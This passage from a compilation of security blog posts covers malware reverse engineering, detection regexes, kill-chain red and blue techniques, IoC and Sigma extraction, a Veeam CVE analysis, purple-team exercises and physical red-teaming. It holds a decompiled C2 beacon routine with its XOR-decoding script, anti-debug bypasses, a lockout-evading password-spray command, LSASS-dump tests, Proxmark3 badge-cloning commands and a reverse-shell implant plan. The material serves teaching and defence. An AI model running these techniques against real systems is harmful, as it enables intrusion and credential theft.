dump-pe.py sample.bin --imports | grep -ie 'virtualalloc|createprocess|socket|connect|winhttp|urldownload'
# heavy network imports + virtualalloc + createremotethread = classic dropper/rat step 2 — static analysis in ghidra /* ghidra decompiler — network initialisation function (after renaming) */
void init_c2_connection(void) {
    hinternet hsession;
    hinternet hconnect;
    char c2_host [256];
    char decrypted [256];
    
    /* xor decode the c2 hostname from embedded blob */
    xor_decode(&dat_0040a100, 0x12, decrypted, 0x12);  /* key = 0x12 */
    
    hsession = winhttpopen(
        l"mozilla/5.0 (compatible; msie 9.0)",  /* custom ua */
        winhttp_access_type_default_proxy,
        null, null, 0
    );
    
    hconnect = winhttpconnect(
        hsession,
        (lpcwstr)decrypted,  /* xor-decoded hostname */
        443,
        0
    );
    
    /* beacon loop follows */
    beacon_loop(hconnect);
} step 3 — decrypt the embedded c2 hostname #!/usr/bin/env python3
# extract xor-encoded c2 hostname from sample
# identified in ghidra: dat_0040a100, length 0x12, key 0x12

with open('sample.bin', 'rb') as f:
    data = f.read()

# convert virtual address to file offset
# for a .data section at va 0x0040a000, file offset 0x8200:
va_offset  = 0x0040a000
file_offset = 0x8200

data_va = 0x0040a100
file_offset = file_offset + (data_va - va_offset)

encoded = data[file_offset : file_offset + 0x12]
xor_key = 0x12

decoded = bytes([b ^ xor_key for b in encoded])
print(f'encoded: {encoded.hex()}')
print(f'decoded: {decoded}')
# → decoded: b'c2.evil-domain.com'

# verify by checking the decoded string is a valid hostname
import re
if re.match(r'^[a-za-z0-9.-]+\.[a-za-z]{2,}$', decoded.decode('ascii', errors='ignore')):
    print('[+] valid hostname extracted — confirmed c2') useful x64dbg techniques essential x64dbg workflow for dynamic analysis:

── breakpoints ───────────────────────────────────────────────────
f2              set/toggle breakpoint at current instruction
ctrl+g          go to address or symbol (type: virtualalloc)
bp virtualalloc  break when virtualalloc is called (api breakpoint)
bp ws2_32.connect  break on network connect

── execution ─────────────────────────────────────────────────────
f9              run (continue execution)
f8              step over (don't enter function calls)
f7              step into
f4              run to cursor
ctrl+f9         run until return (execute rest of current function)

── inspection ────────────────────────────────────────────────────
ctrl+d          view in dump (memory at selected address)
ctrl+r          find references to selected address
alt+m           memory map — see all allocated regions
alt+b           breakpoint list
ctrl+l          log window

── anti-analysis bypass ──────────────────────────────────────────
  most malware checks:
  - isdebuggerpresent → patch to return 0 or set eax=0 after call
  - checkremotedebuggerpresent → same approach
  - timing checks (rdtsc) → nop the conditional jump after
  - plugin: scyllahide — automatically patches common anti-debug techniques

── dump memory ───────────────────────────────────────────────────
  after unpacking:
  1. find the oep (original entry point) — break when execution leaves
     the packer stub and enters the real code
  2. plugins → scylla → dump (choose oep address)
  3. fix imports → iat autosearch → get imports → fix dump
  4. save: fully functional unpacked executable resources and next steps do crackmes. start at the easiest tier on crackmes.one, work up. the skill that accelerates everything is pattern recognition — seeing `test eax, eax` / `jz` and immediately thinking 'null check or function return check'. that only comes from volume. 30 minutes of crackmes per day for 60 days will fundamentally change how you read disassembly.

title: Regex for Security Analysts — The Patterns You Need and Nothing Else
summary: A compact, copy-paste reference of the regex patterns that actually come up constantly in log analysis, detection rule writing, and OSINT — IPv4/IPv6, domains,
body:
regex for security analysts — the patterns you need and nothing else a compact, copy-paste reference of the regex patterns that actually come up constantly in log analysis, detection rule writing, and osint — ipv4/ipv6, domains, hashes, base64 detection, windows paths, and the ioc formats you'll grep for on a weekly basis. notes regex log-analysis detection-engineering osint not a regex tutorial — a lookup table. these are the patterns i actually reach for when grepping logs, validating ioc feeds, or scripting extraction from raw text. all tested against standard pcre (python `re`, grep -p, most siem query languages with pcre support). network indicators that naive version matches `999.999.999.999`, which isn't a valid address. it's fine for a quick eyeball grep, but if the output feeds an automated blocklist or enrichment pipeline, the octet-bounded version above (each octet capped at 0–255) avoids garbage entries silently breaking downstream tooling. hashes a 32-character hex string matches the md5 pattern whether or not it's actually an md5 hash — a truncated sha256, a hex-encoded guid, and plenty of other 32-char hex strings will false-positive against this pattern in free-text log fields. treat hash-shaped regex matches in unstructured log lines as candidates to verify, not as confirmed iocs, especially before auto-feeding them into a blocklist. encoding & obfuscation detection windows artifacts common ioc / detection formats # pull every ipv4 address out of a firewall log
grep -op '\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b' firewall.log | sort -u

# find powershell encoded-command invocations across a sysmon export
grep -op '(?i)-(?:e|en|enc|encodedcommand)\s+[a-za-z0-9+/=]{20,}' sysmon_export.csv

# extract every cve mentioned in a vendor advisory dump
grep -op '\bcve-\d{4}-\d{4,7}\b' advisory.txt | sort -u

# defanged domains in a threat intel feed -> refang in one pass
grep -op '\b[a-za-z0-9-]+(?:\[\.\]|\(\.\))[a-za-z0-9.-]+\b' feed.txt | sed -e 's/\[\.\]|\(\.\)/./g' regex is the right tool for extraction from unstructured text — raw logs, pdf-to-text dumps, free-form report prose. the moment the source is already structured (json, csv, a proper siem field), parse it with the structured tool instead of regexing the serialized form. a `grep` for an ip inside a json blob will eventually break on a value that happens to contain ip-shaped digits in an unrelated field; `jq '.source_ip'` won't.

title: Red vs Blue: The Eternal Game
summary: The cat-and-mouse between attackers and defenders has no finish line. A structured breakdown of every major kill-chain phase — attacker technique on the left, d
body:
red vs blue: the eternal game the cat-and-mouse between attackers and defenders has no finish line. a structured breakdown of every major kill-chain phase — attacker technique on the left, defender response on the right — and why purple teaming is the only way to close the loop. security red-team blue-team purple-team attack-defense mitre-attack detection adversary-simulation every intrusion is a conversation. the attacker sends a move; the defender responds or misses it. the game has been running since the first worm crawled a network in 1988 and it will never end — because the asymmetry is fundamental: attackers need to find one gap, defenders must close every gap simultaneously.

this post maps the kill chain phase by phase. for each stage: what the attacker does, what artefacts they leave, and what a competent defender should have in place to detect or deny it. read both columns. build the right one. test with the left. the asymmetry problem before the phase-by-phase breakdown, the structural reality defenders must accept:

- **attackers operate in time** — they can spend weeks on reconnaissance before touching a target system
- **defenders operate in real-time** — they must detect while managing change, patching, and business operations simultaneously
- **attackers can iterate freely** — a failed technique costs them time; it costs a defender nothing because they may not have known about it
- **defenders bear the burden of proof** — every alert must be investigated; attackers pay no cost for false positives in your siem

none of this means defence is futile. it means the game is not symmetric and your strategy must account for that. phase 1 — reconnaissance reconnaissance is the phase where defenders have the strongest hand — because the attacker is gathering public data, you can audit the same sources they use. run the attacker's tools against yourself once a quarter. every internal hostname, credential, or technology detail you find in public sources is one the adversary already has. phase 2 — initial access # red team: test your own perimeter for initial access vectors (authorised)

# find exposed admin interfaces
nmap -p 8080,8443,9090,4443,3389,5900,5985 --open <your-ranges>

# password spray test (authorised, with ir team aware)
# use low-and-slow: 1 attempt per account per 30 minutes stays under lockout threshold
python3 spray.py --user-list users.txt --password 'winter2026!' --target mail.corp.com --interval 30

# check your domains against breach databases
curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/user@corp.com' \
  -h 'hibp-api-key: your_key'

# blue team: detect password spray in wazuh / siem
# many unique usernames, same source ip, short time window, all fail (event 4625)
# rule: >20 unique usernames with 4625 from same ip in 10 minutes = spray phase 3 — execution phase 4 — persistence # blue team: hunt for persistence mechanisms (run on windows endpoints)

# registry run key inspection
$runkeys = @(
    'hklm:\software\microsoft\windows\currentversion\run',
    'hklm:\software\microsoft\windows\currentversion\runonce',
    'hkcu:\software\microsoft\windows\currentversion\run'
)
foreach ($key in $runkeys) {
    get-itemproperty -path $key -erroraction silentlycontinue | 
        select-object * -excludeproperty pspath,psparentpath,pschildname,psprovider
}

# scheduled tasks — find non-microsoft tasks
get-scheduledtask | where-object { $_.taskpath -notmatch 'microsoft' } |
    select-object taskname, taskpath, state, @{n='command';e={$_.actions.execute}}

# services with non-standard binary paths
get-wmiobject win32_service |
    where-object { $_.pathname -notmatch 'system32|syswow64|program files' } |
    select-object name, startmode, state, pathname

# wmi event subscriptions (fileless persistence)
get-wmiobject -namespace root\subscription -class __eventfilter
get-wmiobject -namespace root\subscription -class __eventconsumer
get-wmiobject -namespace root\subscription -class __filtertoconsumerbinding phase 5 — privilege escalation phase 6 — lateral movement phase 7 — impact / objectives the purple team bridge red team finds gaps. blue team builds detections. purple team closes the loop between them. without structured purple teaming, red team reports become expensive documents that sit in a backlog.

the purple team model is simple: red and blue work the same attack chain *together, in real time*. red executes technique t1059.001. blue checks if the siem fired. if not, blue writes the detection rule. red tests again. iterate until the technique is covered, then move to the next one.

this is fundamentally different from a traditional pentest where the red team hands over a pdf and leaves. # purple team workflow — atomic red team + siem validation

# step 1: red team executes a specific att&ck technique
invoke-atomictest t1003.001 -testnumbers 1  # lsass memory dump via task manager

# step 2: blue team queries siem for the expected artefact
# in wazuh/kibana:
# query: rule.mitre.technique:"t1003.001" and timestamp:[now-5m to now]
# expected: wazuh rule 92211 or sysmon eid 10 on lsass.exe

# step 3: if no alert — write the detection rule and re-test
# step 4: document in coverage matrix (att&ck navigator layer)

# generate att&ck navigator layer showing detection coverage
python3 - << 'eof'
import json

# techniques with confirmed detection
covered = ['t1059.001', 't1003.001', 't1547.001', 't1558.003', 't1021.002']
no_coverage = ['t1021.003', 't1207', 't1048', 't1134']

layer = {
    'name': 'soc lab coverage',
    'domain': 'enterprise-attack',
    'techniques': [
        {'techniqueid': t, 'color': '#4caf50', 'comment': 'detected'} for t in covered
    ] + [
        {'techniqueid': t, 'color': '#f44336', 'comment': 'no detection'} for t in no_coverage
    ]
}
print(json.dumps(layer, indent=2))
eof
# upload output to https://mitre-attack.github.io/attack-navigator/ most organisations detect fewer than 15% of the att&ck techniques an average red team uses. the mitre att&ck evaluations consistently show that leading edr products miss technique variants that differ slightly from their trained patterns. the answer is not a better product — it is a structured programme of attack simulation and detection validation repeated continuously. purple teaming is not a project. it is a practice.

title: Reading Malware Reports — How to Extract Actionable Intel from a Threat Report PDF
summary: A 40-page vendor threat report is not a deliverable — it's raw material. Notes on the process of turning one into four concrete artifacts: a Sigma rule, an IoC
body:
reading malware reports — how to extract actionable intel from a threat report pdf a 40-page vendor threat report is not a deliverable — it's raw material. notes on the process of turning one into four concrete artifacts: a sigma rule, an ioc blocklist, an att&ck navigator layer, and a one-paragraph management brief, with a worked example. notes threat-intel sigma mitre-attack ioc cti most vendor threat reports get read once, skimmed for the executive summary, and filed away. that's a waste of genuinely useful intelligence — every report buried in prose contains four extractable artifacts, and pulling them out is a mechanical process once you know what to look for. this is that process, walked through against a worked example. the worked example below is a representative excerpt — the kind of paragraph that shows up on page 14 of a typical vendor report, describing a fictional loader-and-backdoor pair used by a tracked cluster: "the initial loader, observed as `update_svc.exe` (sha256: `a3f8c1e0...d92b`), is delivered via a phishing email with a malicious lnk attachment. on execution, the loader establishes persistence via a run key (`hkcu\software\microsoft\windows\currentversion\run\windowsupdatesvc`) pointing to a copy placed in `%appdata%\microsoft\update\`. it beacons to `185.220.101[.]42` over https on port 443 using a hardcoded user-agent string `mozilla/5.0 (compatible; winupdate/2.1)`, and downloads a second-stage backdoor from `cdn-update-relay[.]net`. the backdoor spawns `cmd.exe` as a child process to execute operator commands and uses `rundll32.exe` to load a dll component for credential access via lsass memory." step 1 — extract the ioc blocklist first before anything else, pull every concrete, blockable artifact into a flat list. this is the fastest win and the thing that should ship to the blocking infrastructure (firewall, proxy, edr) within the hour, not after the rest of the analysis is done. # hashes (sha256)
a3f8c1e0...d92b  update_svc.exe (initial loader)

# network indicators
185.220.101.42           # c2 — https beacon
cdn-update-relay.net     # second-stage payload host

# file paths
%appdata%\microsoft\update\update_svc.exe

# registry persistence
hkcu\software\microsoft\windows\currentversion\run\windowsupdatesvc

# network signature
user-agent: mozilla/5.0 (compatible; winupdate/2.1) hashes are the single most perishable ioc type — a one-byte change defeats them entirely, and commodity loaders are frequently rebuilt per-victim specifically to invalidate hash-based blocking. the registry path, the user-agent string, and the behavioural pattern (lnk phishing → run key persistence → lsass access via rundll32) all survive a rebuild. weight your detection effort accordingly: hashes go in the blocklist because they're free, but the sigma rule in step 2 is where the durable value is. step 2 — convert the behavioural description into a sigma rule read the prose for verbs, not nouns: *establishes persistence via a run key*, *spawns cmd.exe as a child process*, *uses rundll32.exe to load a dll for credential access*. each verb phrase is a detectable event. the registry persistence and the rundll32-into-lsass pattern are the two most durable signals in this excerpt — they survive a hash change, a new c2 domain, even a partial rewrite of the loader. title: suspicious run key persistence mimicking windows update
id: 7c2a9e10-3b41-4f6e-9a52-1d8f6c4e9b21
status: experimental
description: |
    detects a run key registry value under windowsupdatesvc naming pointing to
    an executable outside the legitimate windows update install path, matching
    the persistence mechanism described for the update_svc.exe loader cluster.
references:
    - internal-report-2026-06
tags:
    - attack.persistence
    - attack.t1547.001
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        targetobject|contains: 'currentversion\run\windowsupdatesvc'
    filter_legitimate:
        details|startswith: 'c:\windows\system32\'
    condition: selection and not filter_legitimate
falsepositives:
    - unlikely; this run key name does not correspond to any legitimate microsoft component
level: high
---
title: rundll32 loading dll with subsequent lsass access
id: 9f1b3d80-7c2e-4a91-b6f0-2e5d8a14f3c7
status: experimental
description: |
    detects rundll32.exe loading an unsigned dll followed by access to lsass.exe,
    consistent with the credential-access stage described for the second-stage
    backdoor in this cluster.
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access
    product: windows
detection:
    selection:
        sourceimage|endswith: '\rundll32.exe'
        targetimage|endswith: '\lsass.exe'
    condition: selection
falsepositives:
    - some legitimate credential-provider dlls interact with lsass via rundll32; tune against your environment's baseline before enabling at high severity
level: high step 3 — build the att&ck navigator layer map every technique implied by the prose, not just the ones the vendor explicitly labelled. the excerpt names four behaviours; each maps to a specific att&ck technique even though the report itself only used plain english:

- phishing with a malicious lnk attachment → **t1566.001 (phishing: spearphishing attachment)**
- run key persistence → **t1547.001 (boot or logon autostart execution: registry run keys)**
- `cmd.exe` spawned to execute operator commands → **t1059.003 (command and scripting interpreter: windows command shell)**
- `rundll32.exe` loading a dll for lsass credential access → **t1003.001 (os credential dumping: lsass memory)**

this list — four techniques, derived directly from the prose — is what becomes the navigator layer json, scored by confidence rather than left as a flat list. {
  "name": "update_svc.exe cluster — extracted ttps",
  "versions": { "attack": "16", "navigator": "5.1", "layer": "4.5" },
  "domain": "enterprise-attack",
  "techniques": [
    { "techniqueid": "t1566.001", "score": 80, "comment": "lnk attachment delivery" },
    { "techniqueid": "t1547.001", "score": 100, "comment": "run key — high-confidence, sigma rule deployed" },
    { "techniqueid": "t1059.003", "score": 60, "comment": "cmd.exe used for operator commands" },
    { "techniqueid": "t1003.001", "score": 100, "comment": "rundll32 -> lsass, sigma rule deployed" }
  ],
  "gradient": { "colors": ["#ffffff", "#ff6666"], "minvalue": 0, "maxvalue": 100 }
} a technique you have a deployed, validated sigma rule for is a different colour on the heatmap than a technique you've only read about in a report. scoring by detection confidence rather than binary presence turns the navigator layer into a coverage map your team can act on, not just a checklist of what the adversary did. step 4 — the one-paragraph management brief management does not need the sigma rule or the navigator layer. they need one paragraph that answers three questions: what does this threat do, are we exposed to the specific mechanism, and what are we doing about it. nothing else survives the trip to a leadership summary. "a phishing-delivered loader cluster tracked in recent threat reporting establishes persistence via a disguised windows update registry entry, then deploys a backdoor that extracts credentials directly from system memory. we have deployed two detection rules covering this persistence technique and the credential-access method specifically, and added the known command-and-control infrastructure to our blocking lists. no evidence of this activity has been found in our environment to date; this is preventative coverage based on external reporting, not an active incident." read once for iocs (mechanical, five minutes). read again for verbs — the behavioural description — and convert each one into a sigma detection (the part that takes actual thought). map every technique implied by those verbs into a navigator layer, scored by how confident your new detections actually make you. compress the whole thing into three sentences for the audience that will never read past them. in that order — the ioc pass should never wait on the sigma-writing pass, because the blocklist is the cheap win that ships immediately.

title: Ransomware Affiliates Are Hunting Your Backups First — The Veeam RCE Chain
summary: Two critical Veeam Backup & Replication CVEs (CVSS 9.4 and 9.9) let an attacker pivot from a single domain account to wiping the restore path entirely. Why back
body:
ransomware affiliates are hunting your backups first — the veeam rce chain two critical veeam backup & replication cves (cvss 9.4 and 9.9) let an attacker pivot from a single domain account to wiping the restore path entirely. why backup infrastructure has become the first target in the modern ransomware kill chain, not the last. news ransomware veeam backup cve active-exploitation active-directory ransomware-as-a-service affiliates have learned a lesson the hard way for defenders: encryption alone is reversible if the victim has working backups. so the modern playbook inverts the order of operations — neutralise the recovery path *before* detonating the payload. backup infrastructure is no longer the safety net behind the perimeter. it is frequently the first internal target.

march 2026 made this concrete. veeam disclosed seven critical vulnerabilities in backup & replication, the two most severe of which — cve-2026-44963 and cve-2026-21708 — let an attacker go from an ordinary domain account to code execution on the backup server itself. cisa added veeam flaws to the known exploited vulnerabilities catalogue again, continuing a multi-year pattern: ransomware crews specifically chase veeam disclosures. veeam is simply the most visible target — the same affiliates run identical reconnaissance against acronis cyber protect and windows server backup, but veeam's market share keeps it at the top of the list. the two cves that matter cve-2026-44963 needs an authenticated domain account — not an anonymous or unauthenticated actor. that distinction matters operationally: it means any phished low-privilege user, any compromised service account, any foothold at all on the domain is sufficient to reach the backup server. you do not need privilege escalation first. the backup server *is* the privilege escalation. why this keeps happening — the convergence anti-pattern the root cause is architectural, not a single bad patch. in the overwhelming majority of audited environments, the backup management server is joined directly to the production active directory domain it protects. the moment an attacker holds domain admin — or, as cve-2026-44963 demonstrates, sometimes nothing more than a standard domain account — they inherit a path straight into the one system whose entire purpose is surviving the attacker's other objective.

enterprise backup platforms also lean on relational database backends (postgresql for veeam, frequently ms sql elsewhere) to store repository credentials and retention policy. compromise that database and an attacker doesn't need to touch the actual backup files — they can simply rewrite the retention policy or truncate the catalogue so the data silently expires. exploitation mechanics veeam's backup service listens by default on **tcp/9392**. the rce chain in cve-2026-44963 involves an authenticated client sending a crafted request that triggers a deserialization flaw in the service, spawning a process under `nt authority\system`. from there, an attacker reaches for the database utilities already installed alongside the product — `psql.exe` for the postgresql backend that ships with most veeam installs — to manipulate retention policy or purge backup catalogue entries directly, bypassing the application's own retention safeguards. # identify exposed/internal veeam infrastructure (authorised asset discovery)
nmap -p 9392,9401,9419,9420 --open <your-ranges>

# confirm version against the fixed builds
# 12.x must be >= 12.3.2.4854 to be clear of cve-2026-44963
# 12.x must be >= 12.3.2.4465 to be clear of cve-2026-21708
# 13.x must be >= 13.0.1.2067 to be clear of cve-2026-21708

# check cisa kev for current veeam entries
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json \
  | python3 -c "import json,sys; [print(e['cveid'], e['shortdescription']) for e in json.load(sys.stdin)['vulnerabilities'] if 'veeam' in e.get('vendorproject','').lower()]" architectural hardening blueprint **1. identity isolation.** backup management servers should live in an isolated administrative workgroup, or — better — a dedicated single-purpose management ad forest with no trust relationship to the production domain. a domain user account anywhere in production should never be a credential that means anything to the backup server.

**2. true immutability.** hardened repositories on linux with single-use credentials (so even a compromised backup server cannot delete already-written blocks), or object lock in *compliance* mode on s3/azure blob with a retention period that cannot be shortened by any administrative account, including your own.

**3. patch the backup software like it's a domain controller**, not like it's a server that backs up domain controllers. the sla should be the same. detection engineering title: database utility execution against veeam backend by unexpected parent
id: 5b6c8b41-e9de-4b11-be83-9b62a67bc3ef
status: stable
description: |
    detects execution of psql.exe or sqlcmd.exe referencing the veeam database
    when the parent process is not the legitimate veeam backup service itself.
    following cve-2026-44963 / cve-2026-21708, attackers who gain code execution
    on the backup server commonly pivot to the bundled postgresql utilities to
    manipulate retention policy or purge backup history.
references:
    - https://thehackernews.com/2026/03/veeam-patches-7-critical-backup.html
    - https://www.veeam.com/kb4696
tags:
    - attack.impact
    - attack.t1490
logsource:
    category: process_creation
    product: windows
detection:
    selection_utilities:
        image|endswith:
            - '\psql.exe'
            - '\sqlcmd.exe'
    selection_arguments:
        commandline|contains:
            - 'veeam'
            - 'veeambackup'
    filter_legitimate:
        parentimage|endswith: '\veeam.backup.service.exe'
    condition: (selection_utilities and selection_arguments) and not filter_legitimate
falsepositives:
    - database maintenance scripts run by designated dbas through documented change windows
level: critical demonstrating the pivot from a single low-privilege domain account to a shell on the backup server is one of the most consequential findings you can put in a report — it directly quantifies the gap between "we have backups" and "we have backups an attacker with domain access cannot also destroy." if your test environment has a veeam instance joined to the assessed domain, this should be on the path list by default.

sources: [veeam patches 7 critical flaws — the hacker news](https://thehackernews.com/2026/03/veeam-patches-7-critical-backup.html) · [bleepingcomputer](https://www.bleepingcomputer.com/news/security/new-veeam-vulnerability-exposes-backup-servers-to-rce-attacks/) · [veeam kb4696](https://www.veeam.com/kb4696)

title: Purple Team Exercise — Planning and Running a Full Scenario
summary: A step-by-step guide to running a structured purple team exercise: choosing a threat scenario that matches real risk, defining success criteria up front, execut
body:
purple team exercise — planning and running a full scenario a step-by-step guide to running a structured purple team exercise: choosing a threat scenario that matches real risk, defining success criteria up front, executing the kill chain in coordination with the blue team, and converting the results into a lasting detection programme. security purple-team detection-engineering atomic-red-team mitre-attack a purple team exercise isn't a pentest with a defender in the room, and it isn't a tabletop. it's a structured, collaborative test of detection and response capability against specific, agreed techniques — with the explicit goal of leaving the defensive programme measurably better than it started. that goal shapes every decision below. step 1 — choosing a threat scenario the scenario should be the threat actually relevant to the organisation, not the most interesting one to run. three sources, in priority order:

**1. threat intelligence specific to the organisation's sector.** if ransomware affiliates targeting your industry are documented as exploiting backup infrastructure or harvesting infostealer logs for initial access, that's the scenario — not because it's novel, but because it's what's actually being used against peers.

**2. gaps surfaced by a recent incident or near-miss**, internal or industry-wide. a purple team exercise that re-creates a recent real incident under controlled conditions validates whether the fix actually closed the gap, which a post-incident report alone can't prove.

**3. known coverage gaps from prior exercises or assessments.** if the last purple team round found that lateral movement detection was weak, this round's scenario should specifically exercise lateral movement techniques again, post-remediation — not move on to an unrelated kill chain stage. scenario: "ransomware affiliate, initial access via phished credentials,
           targeting backup infrastructure before encryption"

kill chain stages in scope:
  1. initial access      -- t1566.001 (spearphishing attachment)
  2. execution            -- t1059.001 (powershell)
  3. persistence          -- t1547.001 (registry run key)
  4. credential access     -- t1003.001 (lsass memory)
  5. lateral movement      -- t1021.002 (smb/admin shares)
  6. discovery             -- t1018 (remote system discovery, targeting backup infra)
  7. impact (simulated only) -- t1490 (inhibit system recovery -- backup deletion)

explicitly out of scope: actual encryption, actual data exfiltration step 2 — defining success criteria before execution agree on what "detected" and "responded" mean, in writing, before the first technique runs — not in the after-action review when it's convenient to redefine them. vague criteria produce a debate about scoring instead of a measurement of capability. a single pass/fail for the whole exercise hides where the actual gap is. score detected/responded/contained independently for every technique in the kill chain — this is what makes the after-action report actionable instead of a single disappointing or falsely reassuring grade. step 3 — executing the kill chain in coordination purple team execution differs from a red team engagement specifically in the coordination model: the blue team knows an exercise is happening (even if not the exact techniques or timing), and there's a live communication channel open throughout — typically a dedicated chat channel — so the red team can confirm "technique x just executed" immediately after each step, enabling real-time correlation against what the blue team's tooling actually caught. # each technique run is logged with a timestamp posted to the shared channel
# immediately before execution, enabling precise blue-team correlation

invoke-atomictest t1566.001 -showdetailsbrief
invoke-atomictest t1566.001

invoke-atomictest t1059.001
invoke-atomictest t1547.001
invoke-atomictest t1003.001
invoke-atomictest t1021.002
invoke-atomictest t1018 after each technique executes, the blue team independently checks their tooling (siem, edr console) for a corresponding alert and records, against the success criteria from step 2: did it fire, how long did it take, and what action followed. this happens **live**, technique by technique — not as a single retrospective log review at the end, which loses the timing data that's often the most useful signal. step 4 — converting findings into a detection programme the exercise itself is not the deliverable — the detection improvements that outlive it are. for every technique that scored "not detected" or "detected but not responded to within sla," the output is a concrete artifact, not a recommendation to "improve monitoring": the single most common purple-team failure mode is treating each exercise as a standalone event. schedule the next purple team round to specifically re-run the techniques that scored poorly this time, *first*, before introducing new scenario coverage — proving the new sigma rule and soar playbook actually work against a live re-run is the only way to confirm the gap is closed rather than just documented. maintain a living navigator layer scored by detection confidence per technique (the same approach covered in the companion notes on reading malware reports), updated after every purple team cycle. over several quarters this becomes the most honest picture of actual detection coverage the organisation has — far more reliable than a tool vendor's claimed coverage matrix, because every cell is backed by a real, timestamped test.

title: Physical Security Testing — From Badge Clone to Domain Admin
summary: A red team physical assessment methodology, start to finish: the pretexts that get a door opened before you touch a lock, badge cloning with a Proxmark3, mechan
body:
physical security testing — from badge clone to domain admin a red team physical assessment methodology, start to finish: the pretexts that get a door opened before you touch a lock, badge cloning with a proxmark3, mechanical bypass, and turning thirty seconds of physical access into a persistent foothold via a dropped implant. security physical-security red-team social-engineering rfid rogue-device every technique below requires a signed statement of work with explicit physical-testing authorization, a get-out-of-jail letter carried on your person during the engagement, and a pre-agreed emergency contact who can vouch for the test to building security or law enforcement in real time. physical engagements are the category most likely to result in an actual police response if this groundwork is skipped. phase 1 — pretexts that open doors the most reliable way through a physical control is not defeating it — it's getting someone with legitimate access to defeat it for you. effective pretexts share three properties: they give the target a reason to *want* to help rather than just permission to, they match something plausible for that specific facility, and they create urgency without raising suspicion. a high-visibility vest, a clipboard, and a lanyard with literally any badge-shaped object on it does more to defeat human scrutiny than any lockpicking skill will. most successful physical engagements are won in the wardrobe choice made before arriving on site, not in anything done at the door. phase 2 — badge cloning with a proxmark3 once inside (or even from outside a card-reader's read range, for low-frequency systems), a proxmark3 reads and clones the credential most facilities still rely on. **low-frequency (125 khz) prox cards — hid proxcard, em4100 — have no cryptographic protection at all** and clone in seconds. **high-frequency (13.56 mhz) cards — mifare classic, iclass — vary**: mifare classic's encryption (crypto-1) has been broken for over a decade and is crackable in the field; iclass standard security is similarly broken; both desfire ev2/ev3 and iclass se/seos use modern cryptography that resists field cloning entirely. [usb] pm3 --> lf search
[usb] pm3 --> lf hid read
[usb] pm3 --> lf hid clone -r <captured raw id>
# or write directly to a t5577 blank:
[usb] pm3 --> lf em 410x clone --id <captured id> [usb] pm3 --> hf mf info
[usb] pm3 --> hf mf autopwn
# recovers all sector keys via nested/hardnested attack, dumps full card,
# writes the dump to a magic card (uid-changeable clone)
[usb] pm3 --> hf mf restore -f dumped_card.bin field cloning a badge usually doesn't mean asking someone to hand it over — it means brushing a proxmark3 (or a long-range reading antenna built into something innocuous, like a bag) within a few centimetres of a target's badge while they're not paying attention: in a crowded elevator, queuing for coffee, sitting next to them on public transport if the engagement scope and pretext support that level of contact. plan the read opportunity as carefully as the technical clone itself — it's usually the harder half. phase 3 — mechanical and electronic lock bypass when a door isn't badge-controlled, or as a fallback when cloning isn't viable, mechanical bypass covers the rest:

**lock picking** (standard pin-tumbler locks) — a tension wrench and pick set defeats the majority of commercial-grade pin-tumber locks within minutes once the technique is practised; this is a skill that requires hands-on repetition, not just reading about it.

**bypass tools over picking, when speed matters** — under-door tools to push a request-to-exit button from outside, shimming a spring-latch (non-deadbolt) door, or a "bump key" for pin-tumbler locks that tolerates more imprecision than a full pick under time pressure.

**electronic strike attacks** — many electronic door strikes fail open or can be defeated by a relay attack on the wiring if the strike's control wiring is accessible from an unsecured side (a common finding on doors where the strike was retrofitted without re-running conduit properly). phase 4 — deploying a raspberry pi implant physical access that doesn't establish a persistent foothold is a one-time win. a small single-board computer dropped on an internal network during the brief window of access converts "i got into the building" into "i have ongoing remote access," which is almost always the more valuable deliverable for the client. hardware: raspberry pi zero 2 w (small, low power draw, easy to hide behind/under furniture or in an unused wall jack enclosure)

pre-configured before deployment:
  - reverse shell / c2 beacon (e.g. a lightweight agent calling out over https
    to an attacker-controlled listener) set to auto-start on boot
  - outbound-only connectivity assumed -- configured to beacon out, never to
    listen for inbound connections, to survive typical egress-only firewall rules
  - 4g/lte fallback module if budget/scope allows -- survives the implant
    being placed on a network segment with port security or nac that blocks
    an unrecognised mac address
  - physically disguised as innocuous infrastructure (a "spare" poe injector,
    taped under a desk, behind a printer) -- visual plausibility matters as
    much as the network configuration

deployment:
  - plug into any live, unsecured network jack found during the walk (conference
    rooms and unused desks are reliable; physically verify link lights before leaving)
  - confirm beacon check-in remotely before physically leaving the building,
    if the engagement timeline allows -- a dead implant found on day two
    isn't a finding, it's a wasted trip every dropped device needs a documented serial number, deployment timestamp, and physical location, reported to the client's emergency contact at engagement end regardless of whether it was recovered. an undocumented raspberry pi found six months later by it, with no record it was an authorised test, is exactly the kind of incident that turns a successful engagement into a real security event — and a legal problem for you specifically. from implant to domain admin once the implant has a beacon, the rest of the path is identical to any internal network engagement: enumerate the segment it landed on, look for unauthenticated smb/ldap exposure, attempt the standard ad privilege-escalation chain (kerberoasting, as-rep roasting, acl abuse, delegation attacks — covered step-by-step in the companion ad privilege escalation writeup) from that foothold through to domain admin. the physical phase's entire job is producing exactly this foothold; everything after it is conventional internal-network tradecraft.

title: My Penetration Testing Methodology — How I Structure Every Engagement
summary: The personal workflow I run on every engagement: the scoping questions I won't skip, how I prioritise recon, the rule I use to decide lateral movement vs. escal
body:
my penetration testing methodology — how i structure every engagement the personal workflow i run on every engagement: the scoping questions i won't skip, how i prioritise recon, the rule i use to decide lateral movement vs. escalation, how i structure a report so findings survive the client meeting, and what three bad engagements taught me. notes methodology pentest workflow reporting this isn't a generic "recon, exploitation, post-exploitation" framework — every methodology page on the internet already has that diagram. this is the specific set of decisions i make, in order, on every engagement, and why i make them in that order. it's evolved out of mistakes, not theory. scoping — the checklist i won't skip every scoping call, regardless of how rushed it is, covers these five things before i agree to a date: if a client says "oh also feel free to test the staging environment" verbally on a call, that goes in a follow-up email the same day, with an explicit reply confirming it. verbal scope changes are how engagements turn into legal problems. recon prioritisation — where the first two hours go on an external network test, the first two hours are not spent running every tool i own against every host. they're spent answering one question: **what does this organisation actually run, and where does it deviate from default?** specifically, in this order:

**1. what's internet-facing and old.** anything running a version more than 18 months stale is worth a cve lookup before anything else — it's the highest-probability quick win and tells you something about patch discipline organisation-wide.

**2. what's internet-facing and custom.** custom-built applications, not off-the-shelf products, get the owasp-style manual pass — automated scanners systematically under-perform here.

